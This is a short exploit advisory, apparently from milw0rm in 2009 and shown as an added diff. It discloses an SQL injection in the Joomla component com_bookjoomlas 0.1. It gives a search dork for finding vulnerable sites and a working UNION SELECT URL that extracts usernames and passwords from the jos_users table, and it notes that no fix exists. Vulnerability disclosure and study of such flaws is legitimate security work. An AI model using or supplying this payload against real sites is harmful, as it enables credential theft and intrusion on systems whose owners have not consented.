@@ -1,0 +1,62 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Joomla Component com_bookjoomlas
+[+] Version: 0.1
+[+] Website: http://www.alikonweb.it
+
+[+] Bugs: [A] SQL Injection
+
+[+] Exploitation: Remote
+[+] Dork: inurl:"index.php?option=com_bookjoomlas"
+[+] Date: 06 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] SQL Injection
+
+[-] Security risk: low
+[-] File affected: sub_commententry.php
+
+This bug allows a privileged user to view username
+and password of a registered user. Like all SELECT
+vulnerable queries, this can be manipulate to write
+files on system.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] SQL Injection
+
+http://www.site.com/path/index.php?option=com_bookjoomlas&Itemid=26&func=comment&gbid=-1 UNION ALL SELECT 1,2,NULL,4,NULL,6,7,NULL,9,CONCAT(username,0x3a,password),11,12,13,14,15,16 FROM jos_users
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-06]
